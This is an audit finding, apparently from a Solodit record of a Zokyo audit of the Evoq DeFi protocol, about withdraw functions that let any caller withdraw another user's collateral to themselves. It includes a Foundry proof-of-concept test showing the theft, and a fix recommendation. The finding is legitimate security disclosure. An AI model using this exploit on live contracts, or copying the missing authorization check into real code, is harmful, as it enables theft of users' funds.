---
# Core Classification
protocol: Evoq
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 45922
audit_firm: Zokyo
contest_link: none
source_link: https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2025-01-09-Evoq.md
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Zokyo
---

## Vulnerability Title

Unrestricted “On-Behalf” Withdrawal

### Overview


The bug report describes a medium severity issue that has been resolved. The problem was found in two functions, withdraw() and withdrawLogic(), which are used to withdraw funds from the smart contract. These functions do not have proper checks to confirm that the caller is the correct person or has permission to withdraw the funds. This allows an attacker to withdraw another user's funds without their knowledge or consent. The report provides a scenario where an attacker can steal a victim's funds by calling the withdraw() function with the victim's information. The report also includes a code snippet to demonstrate how the attack can be carried out. The recommendation is to add checks to ensure that only the correct person can withdraw funds or to have separate functions for self-withdrawal and on-behalf withdrawals with strong permission checks.

### Original Finding Content

**Severity**: Medium

**Status**: Resolved

**Description (Contracts & Functions)**:

Evoq.sol → withdraw() / internal call _withdraw()
PositionsManager.sol → withdrawLogic()
These functions let the caller specify _supplier and _receiver with no checks confirming that msg.sender is _supplier or has _supplier’s consent. This can allow an attacker to withdraw another user’s supplied collateral to themselves.

**Scenario:**

Attacker calls withdraw(...) with _supplier = Victim and _receiver = Attacker.
The protocol sees Victim’s collateral, processes withdrawal, and sends tokens to the attacker.
Victim’s collateral is stolen with no action on Victim’s part.

**PoC: **
```solidity
   function testWithdraw1_Attack() public {
      uint256 amount = 10000 ether;
      uint256 collateral = amount;


       address bob = address(0x1234);
       address alice = address(0xdeff);
       console.log("Bob address:", bob);
       console.log("Alice address:", alice);
       deal(usdc, address(alice), INITIAL_BALANCE * WAD);
       uint256 aliceBalance = ERC20(usdc).balanceOf(address(alice));
       console.log(aliceBalance);
       vm.startPrank(alice);
       ERC20(usdc).approve(address(evoq), collateral);
       evoq.supply(vUsdc, collateral);




       uint256 bobBalance = ERC20(usdc).balanceOf(address(bob));
       console.log("Bob balance before Unauthorized Withdraw: ", bobBalance);


       vm.startPrank(bob);
       evoq.withdraw(vUsdc, collateral, alice, bob);


       bobBalance = ERC20(usdc).balanceOf(address(bob));
       console.log("Bob balance after Unauthorized Withdraw", bobBalance);


   }
```
In other words, if Alice supplies funds to the smart contract as a supplier, an unauthorized user Bob can withdraw her funds or collateral from the smart contract.

**Recommendation**:

Enforce msg.sender == _supplier or require an explicit authorization mechanism for on-behalf withdrawals.
Alternatively, provide distinct “withdraw self” vs. “withdraw on behalf” methods with strong permission checks.

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Zokyo |
| Protocol | Evoq |
| Report Date | N/A |
| Finders | Zokyo |

### Source Links

- **Source**: https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2025-01-09-Evoq.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

